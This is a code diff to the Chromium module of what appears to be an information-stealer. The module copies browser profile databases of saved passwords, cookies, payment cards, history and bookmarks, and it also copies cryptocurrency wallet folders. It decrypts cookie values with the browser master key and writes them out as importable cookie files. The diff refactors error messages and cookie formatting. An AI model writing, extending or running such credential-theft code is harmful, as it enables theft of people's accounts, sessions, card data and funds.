@@ -133,7 +133,7 @@ class Chromium:
 
         return data
 
-    def _copy_files(self, storage_path: str, main_path: str, alt_path: str = None, error: str = "") -> bool:
+    def _copy_files(self, profile: str, storage_path: str, main_path: str, alt_path: str = None, error: str = "") -> bool:
         """
         Copies the file/directory or prints an error if it is not found.
         :param storage_path: str
@@ -154,7 +154,7 @@ class Chromium:
             copy(alt_path, storage_path)
 
         else:
-            print(f'[{self.__browser_name}]: {error}')
+            print(f'[{self.__browser_name}]: {profile} - {error}')
             return False
 
         return True
@@ -169,7 +169,7 @@ class Chromium:
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Passwords.db")
 
-        if self._copy_files(filename, main_path, alt_path, "No passwords found") is False:
+        if self._copy_files(profile, filename, main_path, alt_path, "No passwords found") is False:
             return
 
         cursor, connection = self._get_db_connection(filename)
@@ -203,7 +203,7 @@ class Chromium:
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Cookies.db")
 
-        if self._copy_files(filename, main_path, alt_path, "No cookies found") is False:
+        if self._copy_files(profile, filename, main_path, alt_path, "No cookies found") is False:
             return
 
         cursor, connection = self._get_db_connection(filename)
@@ -217,21 +217,12 @@ class Chromium:
             return
 
         cookies_list_filtered = [row for row in cookies_list if row[0] != ""]
-        words = []
 
-        temp = []
-
-        for row in cookies_list_filtered:
-
-            for keyword in self.__config.CookiesKeywords:
-
-                if "https" in keyword:
-                    keyword = keyword.split("[")[1].split("]")[0]
-
-                if keyword in row[0] and keyword not in words:
-                    words.append(keyword)
-
-            temp.append(f"{row[0]}\tTRUE\t/\tFALSE\t2538097566\t{row[1]}\t{ self._decrypt(row[2], self.__master_key)}")
+        data = self.__config.CookiesData
+        temp = [
+            data.format(row[0], row[1], self._decrypt(row[2], self.__master_key))
+            for row in cookies_list_filtered
+        ]
 
         with open(path.join(self.__path, rf"{profile} Cookies.txt"), "a", encoding="utf-8") as cookies:
             cookies.write("\n".join(row for row in temp))
@@ -248,7 +239,7 @@ class Chromium:
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Cards.db")
 
-        if self._copy_files(filename, main_path, alt_path, "No cards found") is False:
+        if self._copy_files(profile, filename, main_path, alt_path, "No cards found") is False:
             return
 
         cursor, connection = self._get_db_connection(filename)
@@ -282,7 +273,7 @@ class Chromium:
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} History.db")
 
-        if self._copy_files(filename, main_path, alt_path, "No history found") is False:
+        if self._copy_files(profile, filename, main_path, alt_path, "No history found") is False:
             return
 
         cursor, connection = self._get_db_connection(filename)
@@ -317,7 +308,7 @@ class Chromium:
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Bookmarks")
 
-        if self._copy_files(filename, main_path, alt_path, "No bookmarks found") is False:
+        if self._copy_files(profile, filename, main_path, alt_path, "No bookmarks found") is False:
             return
 
         file = self._get_file(filename)
@@ -388,7 +379,7 @@ class Chromium:
             try:
 
                 filename = path.join(self.__path, rf'{profile} {wallet["name"]}')
-                self._copy_files(filename, path.join(wallets, wallet["folder"]), error="No wallets found")
+                self._copy_files(profile, filename, path.join(wallets, wallet["folder"]), error=f'No {wallet["name"]} found')
 
             except Exception as e:
                 print(f"[{self.__browser_name}]: {repr(e)}")
